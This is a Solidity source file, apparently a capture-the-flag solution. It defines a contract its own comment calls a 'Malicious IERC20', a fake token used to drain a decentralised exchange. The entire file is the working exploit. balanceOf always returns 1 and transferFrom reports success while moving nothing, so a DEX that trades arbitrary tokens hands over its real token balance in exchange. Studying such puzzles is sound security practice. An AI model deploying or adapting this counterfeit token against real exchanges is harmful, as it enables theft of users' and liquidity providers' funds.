// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract HDexTwo {
    /**
        Malicious IERC20,
        maniupulates price such that all of the DEX's balance of a 
        token are exchanged in one transaction in return for nothing,
        and provides a transferFrom that adheres to the interface requirements but does nothing.
     */
    function balanceOf(address) external pure returns (uint256) {
        return 1;
    }

    function transferFrom(
        address,
        address,
        uint256
    ) external pure returns (bool) {
        return true;
    }
}
